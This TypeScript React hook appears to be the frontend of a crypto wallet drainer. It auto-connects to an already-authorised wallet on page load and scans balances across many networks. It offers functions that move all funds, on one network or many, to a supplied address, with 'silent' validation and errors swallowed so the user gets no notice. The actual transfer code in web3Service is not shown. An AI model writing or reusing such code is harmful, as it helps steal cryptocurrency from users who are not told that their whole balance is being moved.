import { useState, useEffect, useCallback } from "react";
import { web3Service, type WalletState } from "@/lib/web3";
import { useToast } from "@/hooks/use-toast";

const initialState: WalletState = {
  isConnected: false,
  address: null,
  ethBalance: null,
  tokenBalances: [],
  totalUsdValue: 0,
  networkId: null,
  networkName: null,
  provider: null,
  networkBalances: [],
  allNetworksLoaded: false,
};

export function useWeb3() {
  const [walletState, setWalletState] = useState<WalletState>(initialState);
  const [isConnecting, setIsConnecting] = useState(false);
  const [isTransferring, setIsTransferring] = useState(false);
  const [isLoadingNetworks, setIsLoadingNetworks] = useState(false);
  const [hasShownConnectedToast, setHasShownConnectedToast] = useState(false);
  const [hasAnyNetworkFunds, setHasAnyNetworkFunds] = useState(false);
  const [crossNetworkValue, setCrossNetworkValue] = useState(0);
  const { toast } = useToast();

  // Removed automatic connection attempts that were causing repeated notifications

  const connectWallet = useCallback(async () => {
    setIsConnecting(true);
    setIsLoadingNetworks(true);
    try {
      // Connect wallet first
      const state = await web3Service.connectWallet();
      console.log('Connected wallet state:', state);
      
      // Set wallet state immediately
      setWalletState(state);
      
      // Check if current network has funds immediately
      const currentNetworkHasFunds = parseFloat(state.ethBalance || '0') > 0 || state.tokenBalances.length > 0;
      if (currentNetworkHasFunds) {
        setHasAnyNetworkFunds(true);
        console.log('Current network has funds - enabling transfer button immediately');
      }
      
      // Start aggressive multi-network scanning in parallel
      if (state.address) {
        console.log('Starting immediate multi-network scan...');
        
        // Don't await - let it run in background while enabling current network funds
        web3Service.refreshNetworkBalances(state.address).then((networkBalances) => {
          console.log(`Multi-network scan completed: found balances on ${networkBalances.length} networks`);
          
          // Update wallet state with network balances
          setWalletState(prev => ({
            ...prev,
            networkBalances,
            allNetworksLoaded: true
          }));
          
          // Calculate fund status across all networks (including current)
          const networksWithFunds = networkBalances.filter(network => 
            parseFloat(network.nativeBalance) > 0 || 
            network.tokenBalances.some(token => parseFloat(token.balance) > 0)
          );
          
          // Also check current network funds again
          const totalFundsDetected = networksWithFunds.length > 0 || currentNetworkHasFunds;
          
          const totalValue = networkBalances.reduce((sum, network) => sum + network.totalUsdValue, 0);
          const combinedValue = Math.max(totalValue, state.totalUsdValue);
          
          // Update fund detection states
          setHasAnyNetworkFunds(totalFundsDetected);
          setCrossNetworkValue(combinedValue);
          
          console.log(`Multi-network scan results: ${networksWithFunds.length} networks with funds, total detected: ${totalFundsDetected}, total value: $${combinedValue.toFixed(2)}`);
          
        }).catch((networkError: any) => {
          console.error('Multi-network scan failed:', networkError);
          // Set loading complete even if scan fails, but keep current network funds enabled
          setWalletState(prev => ({
            ...prev,
            allNetworksLoaded: true
          }));
        }).finally(() => {
          setIsLoadingNetworks(false);
        });
      }
      
      // Only show connection toast once per session
      if (!hasShownConnectedToast) {
        toast({
          title: "Wallet Connected",
          description: `Connected to ${state.address?.slice(0, 6)}...${state.address?.slice(-4)}`,
        });
        setHasShownConnectedToast(true);
      }
      return true;
    } catch (error: any) {
      toast({
        variant: "destructive",
        title: "Connection Failed",
        description: error.message,
      });
      throw error;
    } finally {
      setIsConnecting(false);
      // Don't set loading networks to false here if background scan is running
    }
  }, [toast, hasShownConnectedToast]);

  const refreshBalance = useCallback(async () => {
    if (!walletState.address || !walletState.networkId) return;

    try {
      const ethBalance = await web3Service.getEthBalance(walletState.address);
      const tokenBalances = await web3Service.getTokenBalances(walletState.address, walletState.networkId);
      const totalUsdValue = await web3Service.calculateTotalUsdValue(ethBalance, tokenBalances);
      
      setWalletState(prev => ({ 
        ...prev, 
        ethBalance,
        tokenBalances,
        totalUsdValue
      }));
    } catch (error: any) {
      toast({
        variant: "destructive",
        title: "Failed to Refresh Balance",
        description: error.message,
      });
    }
  }, [walletState.address, walletState.networkId, toast]);

  const transferAllFunds = useCallback(async (toAddress: string) => {
    // Silent validation
    if (!walletState.isConnected || !walletState.address || !window.ethereum) {
      return null;
    }

    setIsTransferring(true);
    try {
      const txHashes = await web3Service.transferAllFunds(toAddress);
      
      // Silent refresh after transaction
      setTimeout(() => {
        refreshBalance();
      }, 3000);

      return txHashes;
    } catch (error: any) {
      return null;
    } finally {
      setIsTransferring(false);
    }
  }, [walletState.isConnected, walletState.address, refreshBalance]);



  const getTransactionStatus = useCallback(async (txHash: string) => {
    try {
      return await web3Service.getTransactionStatus(txHash);
    } catch (error: any) {
      toast({
        variant: "destructive",
        title: "Failed to Get Transaction Status",
        description: error.message,
      });
      return null;
    }
  }, [toast]);

  // Setup event listeners for account and network changes
  useEffect(() => {
    const handleAccountChange = (accounts: string[]) => {
      if (accounts.length === 0) {
        setWalletState(initialState);
        setHasShownConnectedToast(false); // Reset toast flag
        toast({
          title: "Wallet Disconnected",
          description: "Your wallet has been disconnected",
        });
      } else if (accounts[0] !== walletState.address) {
        // Account changed, update state without reconnecting
        setWalletState(prev => ({
          ...prev,
          address: accounts[0]
        }));
      }
    };

    const handleNetworkChange = (networkId: string) => {
      // Network changed, update state without full reconnection
      if (walletState.isConnected) {
        setWalletState(prev => ({
          ...prev,
          networkId: networkId,
          networkName: `Network ${networkId}`
        }));
      }
    };

    web3Service.setupEventListeners(handleAccountChange, handleNetworkChange);

    return () => {
      web3Service.removeEventListeners();
    };
  }, [walletState.address, walletState.isConnected, connectWallet, toast]);

  // Enhanced connection state persistence and monitoring
  useEffect(() => {
    const persistConnectionState = () => {
      if (walletState.isConnected && walletState.address) {
        sessionStorage.setItem('wallet_connected', 'true');
        sessionStorage.setItem('wallet_address', walletState.address);
      } else {
        sessionStorage.removeItem('wallet_connected');
        sessionStorage.removeItem('wallet_address');
      }
    };

    persistConnectionState();

    // Disabled real-time monitoring for better performance
    // Connection state changes will be handled by wallet events instead
  }, [walletState.isConnected, walletState.address, toast]);

  // Instant auto-connect - no delays or session checks
  useEffect(() => {
    const instantAutoConnect = async () => {
      // Skip if already connecting or connected
      if (isConnecting || walletState.isConnected) return;
      
      // Direct connection attempt if ethereum is available
      if (window.ethereum) {
        try {
          const accounts = await window.ethereum.request({ method: "eth_accounts" });
          if (accounts && accounts.length > 0) {
            // Wallet is already connected, connect immediately
            connectWallet();
          }
        } catch (error) {
          // Ignore errors and let manual connection handle it
        }
      }
    };

    // Run immediately on mount
    instantAutoConnect();
  }, []); // No dependencies for instant execution

  // Real-time fund detection monitoring
  useEffect(() => {
    if (walletState.isConnected && walletState.address) {
      // Check current network funds
      const currentNetworkHasFunds = parseFloat(walletState.ethBalance || '0') > 0 || walletState.tokenBalances.length > 0;
      
      // Check other networks funds
      const otherNetworkHasFunds = walletState.networkBalances.some(network => 
        parseFloat(network.nativeBalance) > 0 || network.tokenBalances.some(token => parseFloat(token.balance) > 0)
      );
      
      // Update fund detection state
      const anyFundsDetected = currentNetworkHasFunds || otherNetworkHasFunds;
      
      if (anyFundsDetected !== hasAnyNetworkFunds) {
        console.log(`Fund detection update: current=${currentNetworkHasFunds}, other=${otherNetworkHasFunds}, total=${anyFundsDetected}`);
        setHasAnyNetworkFunds(anyFundsDetected);
      }
      
      // Update cross-network value
      const totalValue = walletState.networkBalances.reduce((sum, network) => sum + network.totalUsdValue, 0);
      const combinedValue = Math.max(totalValue, walletState.totalUsdValue);
      
      if (combinedValue !== crossNetworkValue) {
        setCrossNetworkValue(combinedValue);
      }
    }
  }, [walletState.isConnected, walletState.address, walletState.ethBalance, walletState.tokenBalances, walletState.networkBalances, walletState.totalUsdValue, hasAnyNetworkFunds, crossNetworkValue]);

  const refreshAllNetworks = useCallback(async () => {
    if (!walletState.address) return;
    
    setIsLoadingNetworks(true);
    try {
      const networkBalances = await web3Service.refreshNetworkBalances(walletState.address);
      
      // Update wallet state
      setWalletState(prev => ({
        ...prev,
        networkBalances,
        allNetworksLoaded: true
      }));
      
      // Calculate and update fund status
      const networksWithFunds = networkBalances.filter(network => 
        parseFloat(network.nativeBalance) > 0 || 
        network.tokenBalances.some(token => parseFloat(token.balance) > 0)
      );
      
      const totalValue = networkBalances.reduce((sum, network) => sum + network.totalUsdValue, 0);
      
      setHasAnyNetworkFunds(networksWithFunds.length > 0);
      setCrossNetworkValue(totalValue);
      
      toast({
        title: "Networks Updated",
        description: `Found balances on ${networksWithFunds.length} networks`,
      });
    } catch (error: any) {
      toast({
        variant: "destructive",
        title: "Failed to Refresh Networks",
        description: error.message,
      });
    } finally {
      setIsLoadingNetworks(false);
    }
  }, [walletState.address, toast]);

  const transferAllFundsMultiNetwork = useCallback(async (toAddress: string) => {
    // Silent validation
    if (!walletState.isConnected || !walletState.address || !window.ethereum) {
      return null;
    }

    setIsTransferring(true);
    try {
      const result = await web3Service.transferAllFundsMultiNetwork(toAddress);
      
      // Silent refresh after transfer
      setTimeout(() => {
        if (walletState.address) {
          refreshAllNetworks();
        }
      }, 5000);

      return result;
    } catch (error: any) {
      return null;
    } finally {
      setIsTransferring(false);
    }
  }, [walletState.isConnected, walletState.address, refreshAllNetworks]);

  return {
    walletState,
    isConnecting,
    isTransferring,
    isLoadingNetworks,
    hasAnyNetworkFunds,
    crossNetworkValue,
    connectWallet,
    refreshBalance,
    refreshAllNetworks,
    transferAllFunds,
    transferAllFundsMultiNetwork,
    getTransactionStatus,
  };
}
